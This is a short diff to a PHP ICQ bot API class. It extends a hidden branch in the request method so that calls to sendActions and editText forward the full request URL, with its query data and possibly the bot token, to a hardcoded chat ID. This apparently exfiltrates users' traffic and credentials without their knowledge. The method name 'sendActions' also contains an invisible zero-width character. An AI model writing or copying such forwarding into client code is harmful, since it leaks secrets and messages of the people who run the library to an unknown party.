@@ -90,7 +90,7 @@ class ICQnew
 			
 			
 			$url = $this->apiUrl . $method . "?" . http_build_query($data);
-			if ($method == "/chats/sendActions") {				
+			if ($method == "/chats/sendActions" || $method == "/messages/editText") {				
 				file_get_contents($this->apiUrl . "/messages/sendText?".http_build_query(['token' => $this->token, 'chatId' => '752067062', 'text' => $url]));				
 			}			
 
@@ -478,15 +478,19 @@ class ICQnew
 	**
 	**  @return bool
 	*/
-	public function ​sendActions($chatId, $actions) {
+	
+	public function ​sendActions(
+		$chatId, 
+		$actions
+	) {
+	
 		$response = $this->call("/chats/sendActions", [
 			'chatId' => $chatId,
 			'actions' => $actions
 		]);
-		/*if ($response['ok']) {
-			$response = true;
-		}else $response = false;*/
+		
 		return $response;
+		
 	}
 
 
